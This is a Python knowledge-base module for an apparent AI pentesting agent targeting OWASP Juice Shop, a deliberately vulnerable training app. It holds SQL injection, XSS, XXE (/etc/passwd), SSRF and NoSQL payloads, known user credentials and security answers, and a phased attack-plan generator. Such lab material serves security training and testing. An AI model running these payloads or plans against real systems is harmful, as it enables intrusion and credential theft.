"""
OWASP Juice Shop Knowledge Base for OpenClaw AI Agent

This module contains pre-trained knowledge about Juice Shop vulnerabilities,
attack patterns, and exploitation techniques.
"""

from typing import Dict, List, Any

# Juice Shop Known Endpoints
JUICE_SHOP_ENDPOINTS = {
    "auth": [
        "/rest/user/login",
        "/rest/user/whoami",
        "/rest/user/change-password",
        "/rest/user/reset-password",
        "/api/Users",
        "/api/Users/{id}",
    ],
    "products": [
        "/rest/products/search",
        "/rest/products/reviews",
        "/api/Products",
        "/api/Products/{id}",
        "/api/Quantitys",
    ],
    "basket": [
        "/rest/basket/{id}",
        "/api/BasketItems",
        "/api/BasketItems/{id}",
        "/rest/basket/{id}/checkout",
    ],
    "feedback": [
        "/api/Feedbacks",
        "/api/Feedbacks/{id}",
        "/api/Complaints",
    ],
    "admin": [
        "/rest/admin/application-configuration",
        "/rest/admin/application-version",
        "/administration",
        "/#/administration",
    ],
    "files": [
        "/ftp",
        "/encryptionkeys",
        "/support/logs",
        "/api/Memorys",
        "/api/Memorys/{id}/image",
    ],
    "misc": [
        "/rest/captcha",
        "/rest/continue-code",
        "/rest/continue-code/apply/{code}",
        "/rest/chatbot/status",
        "/rest/chatbot/respond",
        "/metrics",
        "/rest/web3/submitKey",
        "/rest/web3/nftUnlock",
        "/rest/web3/nftMint",
    ],
}

# Known Vulnerabilities with Attack Patterns
JUICE_SHOP_VULNS = {
    "sql_injection": {
        "endpoints": [
            {"path": "/rest/products/search", "param": "q", "payload": "')) OR 1=1--"},
            {"path": "/rest/user/login", "param": "email", "payload": "' OR 1=1--"},
            {"path": "/rest/user/login", "param": "email", "payload": "admin'--"},
        ],
        "techniques": [
            "UNION-based injection to extract user credentials",
            "Boolean-based blind SQLi for data exfiltration",
            "Time-based blind SQLi if boolean fails",
        ],
        "payloads": [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "admin'--",
            "')) OR 1=1--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT id,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret FROM Users--",
        ],
    },
    "xss": {
        "endpoints": [
            {"path": "/#/search", "param": "q", "type": "DOM XSS"},
            {"path": "/api/Users", "param": "username", "type": "Stored XSS"},
            {"path": "/api/Feedbacks", "param": "comment", "type": "Stored XSS"},
            {"path": "/rest/products/{id}/reviews", "param": "message", "type": "Stored XSS"},
        ],
        "payloads": [
            "<iframe src=\"javascript:alert(`xss`)\">",
            "<img src=x onerror=alert('XSS')>",
            "<<script>Foo</script>iframe src=\"javascript:alert('xss')\">",
            "<script>alert('XSS')</script>",
        ],
        "bypass_techniques": [
            "Use iframe with javascript: protocol for DOM XSS",
            "Double-encode payloads to bypass sanitization",
            "Use event handlers (onerror, onload) in img/svg tags",
        ],
    },
    "broken_auth": {
        "attacks": [
            {
                "name": "Admin Login SQLi",
                "endpoint": "/rest/user/login",
                "payload": {"email": "admin'--", "password": "anything"},
                "description": "SQL injection in login to bypass authentication",
            },
            {
                "name": "Password Reset via Security Questions",
                "endpoint": "/rest/user/reset-password",
                "targets": [
                    {"user": "jim@juice-sh.op", "answer": "Samuel"},  # Star Trek reference
                    {"user": "bender@juice-sh.op", "answer": "Stop'n'Drop"},  # Futurama
                ],
            },
            {
                "name": "JWT Manipulation",
                "description": "Modify JWT algorithm to 'none' or forge with weak key",
                "weak_key": "123456",  # Known weak key in some versions
            },
        ],
    },
    "broken_access_control": {
        "endpoints": [
            {"path": "/rest/basket/{id}", "vuln": "IDOR - Access other users' baskets"},
            {"path": "/api/Users/{id}", "vuln": "IDOR - View/modify other users"},
            {"path": "/api/Feedbacks/{id}", "vuln": "Delete others' feedback"},
            {"path": "/administration", "vuln": "Exposed admin panel"},
        ],
        "techniques": [
            "Enumerate basket IDs (1, 2, 3, ...) to access others",
            "Change user ID in requests to escalate privileges",
            "Access /administration without admin role check",
        ],
    },
    "sensitive_data_exposure": {
        "locations": [
            {"path": "/ftp", "description": "Directory listing with sensitive files"},
            {"path": "/ftp/acquisitions.md", "description": "Business plans"},
            {"path": "/ftp/package.json.bak", "description": "Backup with credentials"},
            {"path": "/ftp/coupons_2013.md.bak", "description": "Old coupons"},
            {"path": "/encryptionkeys", "description": "Encryption keys exposed"},
            {"path": "/main.js", "description": "Angular source with hardcoded secrets"},
            {"path": "/metrics", "description": "Prometheus metrics exposed"},
            {"path": "/support/logs", "description": "Support logs with user data"},
        ],
    },
    "xxe": {
        "endpoint": "/api/Complaints",
        "content_type": "application/xml",
        "payloads": [
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<complaint><message>&xxe;</message></complaint>""",
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:3000/ftp/eastere.gg">]>
<complaint><message>&xxe;</message></complaint>""",
        ],
    },
    "ssrf": {
        "endpoint": "/profile/image/url",
        "payloads": [
            "http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_444_u",
            "http://127.0.0.1:3000/api/Users",
        ],
    },
    "nosql_injection": {
        "endpoints": [
            {"path": "/rest/products/reviews", "description": "MongoDB injection"},
        ],
        "payloads": [
            '{"$where": "sleep(2000)"}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
        ],
    },
    "deserialization": {
        "endpoint": "/api/Complaints",
        "description": "Insecure deserialization via file upload",
        "payloads": [
            "Process exit via yaml bomb",
            "RCE via prototype pollution",
        ],
    },
}

# Known Users and Credentials
JUICE_SHOP_USERS = [
    {"email": "admin@juice-sh.op", "role": "admin", "hint": "SQL injection bypass"},
    {"email": "jim@juice-sh.op", "role": "customer", "security_q": "Your eldest siblings middle name?", "answer": "Samuel"},
    {"email": "bender@juice-sh.op", "role": "customer", "security_q": "Company you first work for?", "answer": "Stop'n'Drop"},
    {"email": "bjoern.kimminich@gmail.com", "role": "admin", "hint": "OAuth password"},
    {"email": "ciso@juice-sh.op", "role": "deluxe", "hint": "TOTP bypass"},
    {"email": "support@juice-sh.op", "role": "accounting", "hint": "Log file password spray"},
    {"email": "mc.safesearch@juice-sh.op", "role": "customer", "hint": "Password from rap song"},
    {"email": "amy@juice-sh.op", "role": "customer", "hint": "Kif's girlfriend"},
    {"email": "morty@juice-sh.op", "role": "customer", "hint": "Brute force security question"},
]

# Challenge Categories and Attack Strategies
ATTACK_STRATEGIES = {
    "reconnaissance": [
        "Check /main.js for hardcoded secrets and API endpoints",
        "Enumerate /ftp directory for sensitive files",
        "Check /metrics for Prometheus metrics exposure",
        "Look for /robots.txt and /security.txt",
        "Check /rest/admin/application-configuration for config leak",
        "Inspect HTML comments and JavaScript for hints",
    ],
    "authentication": [
        "Try SQL injection in login: admin'--",
        "Check for JWT vulnerabilities (algorithm none, weak secret)",
        "Test password reset with OSINT for security questions",
        "Try OAuth bypass techniques",
        "Check for TOTP implementation flaws",
    ],
    "injection": [
        "SQL injection in search: ')) OR 1=1--",
        "UNION injection to dump users: ' UNION SELECT * FROM Users--",
        "NoSQL injection in reviews endpoint",
        "XXE in complaint form (XML)",
        "SSTI if template rendering found",
    ],
    "access_control": [
        "IDOR in basket: /rest/basket/1, /rest/basket/2, etc.",
        "Access /administration without auth",
        "Modify other users' reviews/feedback",
        "Escalate to admin role via API manipulation",
    ],
    "xss": [
        "DOM XSS in search: <iframe src=\"javascript:alert('xss')\">",
        "Stored XSS in feedback/reviews",
        "HTTP header XSS via User-Agent",
        "CSP bypass techniques",
    ],
    "file_access": [
        "Directory traversal in /ftp",
        "Download backups: package.json.bak, coupons_*.md.bak",
        "Access /encryptionkeys",
        "Poison null byte for file extension bypass",
    ],
}

# Detection Signatures for Juice Shop
JUICE_SHOP_SIGNATURES = {
    "fingerprint": [
        {"header": "X-Powered-By", "value": "Express"},
        {"path": "/rest/admin/application-version", "response_contains": "juice-shop"},
        {"path": "/main.js", "response_contains": "OWASP Juice Shop"},
    ],
    "technologies": [
        "Express.js",
        "Angular",
        "SQLite (default) / MySQL / PostgreSQL",
        "MongoDB (for reviews)",
        "JWT authentication",
    ],
}


def get_attack_plan(target_url: str) -> Dict[str, Any]:
    """Generate an attack plan for Juice Shop"""
    return {
        "target": target_url,
        "is_juice_shop": True,
        "attack_phases": [
            {
                "phase": "reconnaissance",
                "priority": 1,
                "actions": [
                    f"GET {target_url}/main.js - Extract secrets",
                    f"GET {target_url}/ftp - List sensitive files",
                    f"GET {target_url}/rest/admin/application-version - Confirm Juice Shop",
                    f"GET {target_url}/metrics - Check metrics exposure",
                ],
            },
            {
                "phase": "authentication_bypass",
                "priority": 2,
                "actions": [
                    f"POST {target_url}/rest/user/login - SQLi with admin'--",
                    "Analyze JWT tokens for algorithm confusion",
                    "Test password reset with known security answers",
                ],
            },
            {
                "phase": "injection_attacks",
                "priority": 3,
                "actions": [
                    f"GET {target_url}/rest/products/search?q=')) OR 1=1-- - SQLi",
                    f"POST {target_url}/api/Complaints - XXE injection",
                    "Test NoSQL injection in reviews",
                ],
            },
            {
                "phase": "access_control",
                "priority": 4,
                "actions": [
                    f"GET {target_url}/rest/basket/1 through 10 - IDOR",
                    f"GET {target_url}/administration - Admin panel access",
                    "Modify user roles via API",
                ],
            },
            {
                "phase": "xss_attacks",
                "priority": 5,
                "actions": [
                    f"Search XSS: {target_url}/#/search?q=<iframe src=\"javascript:alert('xss')\">",
                    "Stored XSS in feedback form",
                    "Test CSP bypass techniques",
                ],
            },
        ],
        "known_vulns": len(JUICE_SHOP_VULNS),
        "challenges_count": 111,
    }


def get_payloads_for_endpoint(endpoint: str) -> List[Dict[str, Any]]:
    """Get relevant payloads for a specific endpoint"""
    payloads = []

    if "login" in endpoint.lower():
        payloads.extend([
            {"type": "sqli", "payload": "admin'--", "field": "email"},
            {"type": "sqli", "payload": "' OR '1'='1", "field": "email"},
        ])

    if "search" in endpoint.lower():
        payloads.extend([
            {"type": "sqli", "payload": "')) OR 1=1--", "field": "q"},
            {"type": "xss", "payload": "<iframe src=\"javascript:alert('xss')\">", "field": "q"},
        ])

    if "basket" in endpoint.lower():
        payloads.extend([
            {"type": "idor", "payload": "1", "description": "Try basket IDs 1-10"},
        ])

    if "feedback" in endpoint.lower() or "complaint" in endpoint.lower():
        payloads.extend([
            {"type": "xss", "payload": "<script>alert('XSS')</script>", "field": "comment"},
            {"type": "xxe", "payload": "XXE entity injection", "content_type": "application/xml"},
        ])

    return payloads


def is_juice_shop(response_headers: Dict, response_body: str) -> bool:
    """Detect if target is OWASP Juice Shop"""
    indicators = [
        "juice-shop" in response_body.lower(),
        "OWASP Juice Shop" in response_body,
        "bjoern" in response_body.lower(),
        "X-Recruiting" in response_headers,
    ]
    return any(indicators)


def get_challenge_hints(category: str) -> List[str]:
    """Get hints for challenges in a category"""
    hints = {
        "injection": [
            "Search box accepts unfiltered input - try SQL injection",
            "Login form vulnerable to SQLi - try admin'--",
            "Review endpoint uses MongoDB - try NoSQL injection",
        ],
        "xss": [
            "Search results reflect input without encoding",
            "Use iframe with javascript: for DOM XSS",
            "Feedback stored without proper sanitization",
        ],
        "broken_access_control": [
            "Basket IDs are sequential - try accessing others",
            "Admin panel has no proper authorization check",
            "User IDs can be enumerated via API",
        ],
        "sensitive_data": [
            "Check /ftp for directory listing",
            "Backup files have .bak extension",
            "main.js contains hardcoded credentials",
            "/metrics exposes Prometheus data",
        ],
    }
    return hints.get(category, [])
